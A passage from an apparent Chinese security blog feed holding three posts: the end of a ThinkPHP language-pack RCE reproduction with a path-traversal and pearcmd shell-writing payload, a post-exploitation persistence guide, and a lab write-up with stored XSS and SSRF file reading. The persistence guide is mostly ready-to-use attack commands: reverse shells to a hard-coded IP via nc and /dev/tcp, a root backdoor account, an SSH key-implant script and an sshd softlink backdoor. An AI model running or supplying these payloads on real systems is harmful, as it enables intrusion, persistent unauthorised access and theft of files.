class="string">&#x27;/^([a-z\d\-]+)/i&#x27;</span>, <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>), <span class="variable">$matches</span>);</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$match</span>) &#123;</span><br><span class="line">               <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$matches</span>[<span class="number">1</span>]);</span><br><span class="line">               <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;accept_language&#x27;</span>][<span class="variable">$langSet</span>])) &#123;</span><br><span class="line">                   <span class="variable">$langSet</span> = <span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;accept_language&#x27;</span>][<span class="variable">$langSet</span>];</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;allow_lang_list&#x27;</span>]) || <span class="title function_ invoke__">in_array</span>(<span class="variable">$langSet</span>, <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;allow_lang_list&#x27;</span>])) &#123;</span><br><span class="line">           <span class="comment">// 合法的语言</span></span><br><span class="line">           <span class="variable language_">$this</span>-&gt;range = <span class="variable">$langSet</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;range;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>进入第一个if </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;detect_var&#x27;      =&gt; &#x27;lang&#x27;,</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;config[&#x27;detect_var&#x27;]    ==  lang</span><br></pre></td></tr></table></figure><p>也就是说我们 传递的参数是lang</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>$request-&gt;get是thinkphp app&#x2F;Request中的方法 这里不详细说明 我们可以理解为 把lang传递的数据小写赋值给$langSet</p><p>$this-&gt;config[‘allow_lang_list’]默认是空</p><p>最后返回 lang传递的数据</p><p>进入load</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">load</span>([</span><br><span class="line">                <span class="variable">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getThinkPath</span>() . <span class="string">&#x27;lang&#x27;</span> . DIRECTORY_SEPARATOR . <span class="variable">$langset</span> . <span class="string">&#x27;.php&#x27;</span>,</span><br><span class="line">            ]);</span><br></pre></td></tr></table></figure><p> $this-&gt;app-&gt;getThinkPath()默认的php安装路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx\tp\vendor\topthink\framework\src\</span><br></pre></td></tr></table></figure><p>默认</p><p>DIRECTORY_SEPARATOR&#x3D;’\‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx\tp\vendor\topthink\framework\src\lang\我们输入的数据.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ((<span class="keyword">array</span>) <span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$_file</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$_file</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$_file</span>);</span><br><span class="line">                <span class="variable">$lang</span>   = <span class="title function_ invoke__">array_change_key_case</span>(<span class="variable">$result</span>) + <span class="variable">$lang</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>让$_file存在 利用..&#x2F;..&#x2F;..&#x2F;目录穿越 绕过if </p><p>进入parse()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parse</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$type</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;yml&#x27;</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;yaml&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;yaml_parse_file&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result</span> = <span class="title function_ invoke__">yaml_parse_file</span>(<span class="variable">$file</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$result</span>) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$result</span>) ? <span class="variable">$result</span> : [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>$type就是php 它给加的默认后缀</p><h4 id="pear-写入文件"><a href="#pear-写入文件" class="headerlink" title="pear 写入文件"></a>pear 写入文件</h4><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p><p>利用条件</p><p>1）服务器上安装pear，也就是存在pearcmd.php。同时知道pearcmd.php的文件路径</p><p>2）web环境下在php.ini中register_argc_argv设置为On</p><p>3）存在文件包含，可以包含php文件并且没有open_basedir的限制</p><p>php的pear扩展是一个命令行扩展管理工具，默认的安装路径在<code>/usr/local/lib/php/pearcmd.php</code>，在命令行下可以用<code>pear</code>或<code>php /usr/local/lib/php/pearcmd.php</code>运行，虽然不是在web的目录下，但是如果存在文件包含漏洞，我们就可以运行这个命令行工具</p><p>我们再来看<code>register_argc_argv</code>选项，在这个选项字段如果选了<code>ON</code>的话，URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，无论后面的内容是否有等号。</p><p>docker 下的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lang=../../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/+/var/www/html/shell.php</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;thinkphp-多语言RCE&quot;&gt;&lt;a href=&quot;#thinkphp-多语言RCE&quot; class=&quot;headerlink&quot; title=&quot;thinkphp 多语言RCE&quot;&gt;&lt;/a&gt;thinkphp 多语言RCE&lt;/h1&gt;&lt;p&gt;本次复现 不像传统漏洞复现 以正向流</summary>
      
    
    
    
    
    <category term="thinkphp" scheme="http://example.com/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>权限维持小记-ssh</title>
    <link href="http://example.com/2023/10/31/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B0%8F%E8%AE%B0-ssh/"/>
    <id>http://example.com/2023/10/31/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E5%B0%8F%E8%AE%B0-ssh/</id>
    <published>2023-10-31T09:08:01.000Z</published>
    <updated>2023-10-31T09:08:26.696Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h1><p>反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 43.143.165.217 2334 &gt;/tmp/f</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/43.143.165.217/2334 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="ubuntu-x2F-debain"><a href="#ubuntu-x2F-debain" class="headerlink" title="ubuntu&#x2F;debain"></a>ubuntu&#x2F;debain</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -L</span><br></pre></td></tr></table></figure><p>如果你想通过iptables添加规则允许任何IP连接SSH，你可以使用以下命令。这里假设你使用的是默认的SSH端口22。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br></pre></td></tr></table></figure><p>iptables -A INPUT -p tcp –dport 10086 -j ACCEPT</p><p>这个命令添加一个规则，允许TCP流量通过到达目标端口22（SSH端口）。 <code>-A INPUT</code> 意味着将规则添加到输入链（incoming chain）。</p><p>然后，你需要保存iptables规则以确保它们在系统重新启动时保持。你可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service iptables save</span><br><span class="line">sudo service iptables restart</span><br></pre></td></tr></table></figure><p>或者，如果你使用的是<code>ufw</code>（Ubuntu的简化防火墙管理工具），你可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow 22</span><br></pre></td></tr></table></figure><p>这将允许SSH流量通过ufw，然后你可以使用 <code>sudo ufw enable</code> 保存并激活规则。</p><p>请注意，开放所有IP访问SSH可能存在安全风险。最好限制允许连接的IP范围，以提高安全性。如果服务器直接暴露在公共网络上，强烈建议使用密钥进行身份验证，而不是仅仅依赖密码。</p><h2 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h2><p>启动： systemctl start firewalld</p><p>查看状态： systemctl status firewalld </p><p>禁用，禁止开机启动： systemctl disable firewalld</p><p>停止运行： systemctl stop firewalld</p><p>firewall-cmd –list-port   &#x2F;&#x2F;查看防火墙已经开放的端口</p><p>firewall-cmd –reload<br>firewall-cmd –list-port   &#x2F;&#x2F;查看防火墙已经开放的端口</p><p><strong>删除：</strong></p><p>firewall-cmd –zone&#x3D;public –remove-port&#x3D;80&#x2F;tcp –permanent</p><p><strong>增加</strong></p><p>firewall-cmd –zone&#x3D;public –add-port&#x3D;5&#x2F;tcp –permanent</p><h1 id="0x00-后门账户"><a href="#0x00-后门账户" class="headerlink" title="0x00 后门账户"></a>0x00 后门账户</h1><p> 方法1<br>  添加账号redi1s，设置uid为0，密码为123456</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` redi1s -o -u 0 -g root -G root -s /bin/bash -d /home/test1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh redi1s@IP</span><br></pre></td></tr></table></figure><p> 方法2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test2:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd #增加超级用户账号</span><br><span class="line">passwd test2 #修改test2的密码为123456</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;redis:x:0:1001:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><h1 id="0x01-公私钥"><a href="#0x01-公私钥" class="headerlink" title="0x01 公私钥"></a>0x01 公私钥</h1><h2 id="防火墙导入配置"><a href="#防火墙导入配置" class="headerlink" title="防火墙导入配置"></a>防火墙导入配置</h2><p>ubuntu&#x2F;debain</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br></pre></td></tr></table></figure><p>centos</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=22/tcp --permanent</span><br></pre></td></tr></table></figure><h2 id="ssh服务是否启动"><a href="#ssh服务是否启动" class="headerlink" title="ssh服务是否启动"></a>ssh服务是否启动</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -e| grep ssh</span><br></pre></td></tr></table></figure><p>启动SSH服务的命令取决于操作系统。以下是一些不同操作系统上启动SSH服务的命令：</p><p>Linux</p><ol><li><p><strong>Systemd 系统（例如 Ubuntu 16.04+，CentOS 7+）:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start ssh</span><br></pre></td></tr></table></figure></li><li><p><strong>SysV Init 系统（例如 Ubuntu 14.04，CentOS 6）:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure></li></ol><p>macOS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemsetup -setremotelogin on</span><br></pre></td></tr></table></figure><p>ssh登录时会先检查公钥，公钥位置在~&#x2F;.ssh&#x2F;authorized_keys</p><h2 id="直接启动-SSH-守护进程"><a href="#直接启动-SSH-守护进程" class="headerlink" title="直接启动 SSH 守护进程"></a>直接启动 SSH 守护进程</h2><p>在某些系统上，你可能需要直接启动SSH守护进程，而不使用服务管理工具。SSH守护进程的二进制文件通常是 <code>sshd</code>。你可以使用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/sshd</span><br></pre></td></tr></table></figure><p><strong>如果想要 利用公私钥登录而无需输入密码，需要更改如下配置</strong></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>ssh_config</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure><p>sshd_config</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>攻击机生成 存放在~&#x2F;.ssh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa          <span class="comment">#三次回车</span></span><br><span class="line">id_rsa : 私钥</span><br><span class="line">id_rsa.pub : 公钥</span><br></pre></td></tr></table></figure><p>上传公钥至目标主机即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">路径  /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">cd /root/.ssh</span><br><span class="line">touch authorized_keys</span><br><span class="line">cat id_rsa.pub &gt;&gt; authorized_keys </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者导入本机的公钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIiRWbvrujmlEO1QNPXDeNejtuihzyNzqj+kAVIrE4RrEznN/9gmdkeCQ9Iw7Lp247PhHaoG770SmsFv/NKNlsgT/hYvSbHVVkX6lxsGlIjtbOTCxvuOIH7UmjVYxyGjeQBKjUZId3/XdWlUhMhEYkCX9pZPGZfyBhrJqcz/gdTyQkcMNJTk+pfOUlZ5M8WwGCp0+e0Kw3ybPGT0NPAdFrApRoLhRJy8EVVy+eQ6VkShZWljI5+6wZNZ6kxjSS/krE2dnESLYmgrgB2/tMjIOTjvljCSgau+zIsoAcGJzGjKTWNrHJiboMtdnW3AxUKjOGJitjc/9GjhL96d9GNjaL </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss root@IP</span><br></pre></td></tr></table></figure><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加防火墙规则允许SSH流量</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT || true</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CentOS防火墙规则（永久生效）</span></span><br><span class="line">firewall-cmd --zone=public --add-port=22/tcp --permanent || true</span><br><span class="line">firewall-cmd --reload || true</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动SSH服务</span></span><br><span class="line">/usr/sbin/sshd || true</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置SSH服务器</span></span><br><span class="line">echo &quot;RSAAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config || true</span><br><span class="line">echo &quot;PubkeyAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config || true</span><br><span class="line">echo &quot;AuthorizedKeysFile .ssh/authorized_keys&quot; &gt;&gt; /etc/ssh/sshd_config || true</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成SSH密钥对（自动回车）</span></span><br><span class="line">yes &quot;&quot; | ssh-keygen -t rsa || true</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建.ssh目录（如果不存在）</span></span><br><span class="line">mkdir -p /root/.ssh || true</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在.ssh目录中创建并编辑authorized_keys文件，添加公钥</span></span><br><span class="line">touch /root/.ssh/authorized_keys || true</span><br><span class="line">cat ~/.ssh/id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys || true   #这里可以导入本机的密钥</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印生成的id_rsa文件内容</span></span><br><span class="line">echo &quot;生成的 id_rsa 文件内容：&quot;</span><br><span class="line">cat ~/.ssh/id_rsa || true</span><br><span class="line"></span><br><span class="line">echo &quot;配置完成.&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa user@192.168.6.152</span><br></pre></td></tr></table></figure><h1 id="0x02-SSH软链接"><a href="#0x02-SSH软链接" class="headerlink" title="0x02 SSH软链接"></a>0x02 SSH软链接</h1><p>3.1.1. 查看是否开启pam身份验证<br>  这里如果是no可以去这个配置文件中直接去修改，不过需要是root权限哦。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config|grep UsePAM</span><br></pre></td></tr></table></figure><p>3.1.2. 建立软连接<br>  这里建立软连接后，需要将防火墙的端口开放，如果防火墙是关闭的就无所谓了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su ;/tmp/su -oPort=9999</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启软链接，链接端口为9999</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --add-port=9999/tcp --permanent</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">开启防火墙规则，不然会连接不上</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --reload</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">重启防火墙服务</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --query-port=9999/tcp</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看防火墙9999端口是否被放行，回显为YES即成功放行</span></span><br><span class="line"></span><br><span class="line">iptables -A INPUT -p tcp --dport 9999 -j ACCEPT</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3.1.3. 测试<br>  这里后面的9999是端口，进去随便输入一些密码就可以登录进去了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@183.214.5.153  -p 9999   <span class="comment">##-p 后面这个是端口</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;关闭防火墙&quot;&gt;&lt;a href=&quot;#关闭防火墙&quot; class=&quot;headerlink&quot; title=&quot;关闭防火墙&quot;&gt;&lt;/a&gt;关闭防火墙&lt;/h1&gt;&lt;p&gt;反弹shell&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr</summary>
      
    
    
    
    
    <category term="-后渗透" scheme="http://example.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Gemini-Pentest-v1</title>
    <link href="http://example.com/2023/10/31/Gemini-Pentest-v1/"/>
    <id>http://example.com/2023/10/31/Gemini-Pentest-v1/</id>
    <published>2023-10-31T08:34:50.000Z</published>
    <updated>2023-10-31T08:35:57.244Z</updated>
    
    <content type="html"><![CDATA[<p>环境 </p><p>攻击机 kali IP 192.168.6.142</p><p>靶机  Gemini-Pentest-v1 IP 192.168.6.152 </p><h1 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -v 192.168.6.0/24</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030170530005.png" class="" title="image-20231030170530005"><p>通过更详细的扫描</p><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030171754217.png" class="" title="image-20231030171754217"><p>主机开启了80与22端口 ssh-hostkey只是远程服务器的公共密钥的指纹摘要，用于安全连接。公钥指纹是一种安全机制，用于验证远程服务器的身份，确保你连接到的是你期望连接的服务器而不是恶意的中间人攻击。这里无法利用</p><h1 id="0x01-web渗透"><a href="#0x01-web渗透" class="headerlink" title="0x01 web渗透"></a>0x01 web渗透</h1><p>访问80端口</p><p>打开发现有一个登录的界面</p><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030172740955.png" class="" title="image-20231030172740955"><p>扫描目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.6.152 -e* -i 200                                               </span><br></pre></td></tr></table></figure><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030172428392.png" class="" title="image-20231030172428392"><p>没什么用</p><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030174259265.png" class="" title="image-20231030174259265"><p>开源项目 github搜索下</p><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030174906195.png" class="" title="image-20231030174906195"><p>在线网站<a href="https://www.cmd5.com/default.aspx">md5在线解密破解,md5解密加密 (cmd5.com)</a></p><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030174915253.png" class="" title="image-20231030174915253"><p>在未改密码的情况下</p><p>账号 admin 密码 1234</p><h1 id="0x02-存储型XSS"><a href="#0x02-存储型XSS" class="headerlink" title="0x02 存储型XSS"></a>0x02 存储型XSS</h1><blockquote><p>XSS（Cross Site Scripting）跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行恶意代码，达到攻击的目的</p></blockquote><p>这个项目的display_name存到数据库再从数据库中提取出来 所以可以构成存储型的XSS</p><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030203302583.png" class="" title="image-20231030203302583"><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030201959240.png" class="" title="image-20231030201959240"><h1 id="0x03-wkhtmltopdf-文件包含漏洞到SSRF本地文件读取"><a href="#0x03-wkhtmltopdf-文件包含漏洞到SSRF本地文件读取" class="headerlink" title="0x03 wkhtmltopdf 文件包含漏洞到SSRF本地文件读取"></a>0x03 wkhtmltopdf 文件包含漏洞到SSRF本地文件读取</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php header(&#x27;location:file://&#x27;.$_REQUEST[&#x27;url&#x27;]); ?&gt;       </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe height=&quot;2000&quot; width=&quot;800&quot;  src=&quot;http://192.168.6.142:2333/read.php?url=/etc/passwd&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 192.168.6.142:2333</span><br></pre></td></tr></table></figure><img src="/2023/10/31/Gemini-Pentest-v1/image-20231030213308593.png" class="" title="image-20231030213308593"><h1 id="0x04-SSH公钥认证"><a href="#0x04-SSH公钥认证" class="headerlink" title="0x04 SSH公钥认证"></a>0x04 SSH公钥认证</h1><p>ssh登录时会先检查公钥，公钥位置在~&#x2F;.ssh&#x2F;authorized_keys</p><p>如果想要 